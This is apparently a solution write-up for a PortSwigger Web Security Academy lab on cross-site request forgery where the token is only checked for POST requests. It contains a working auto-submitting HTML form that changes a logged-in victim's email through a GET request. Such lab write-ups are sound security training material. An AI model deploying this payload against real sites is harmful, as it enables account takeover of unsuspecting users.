# [Lab: CSRF where token validation depends on request method](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-request-method)

## Lab

This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`

## Analysis

Prevention using csrf token, but only applies defenses to certain types of requests.

## Solutions

get method:

```html
<html>
  <body>
    <form action="https://id.web-security-academy.net/my-account/change-email" method="GET">
      <input type="hidden" name="email" value="hacked@gmail.com" />
      <!-- <input type="hidden" name="csrf" value="U6fVaj6urpP1CR211FPWwEw649vx6s0V" /> -->
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```
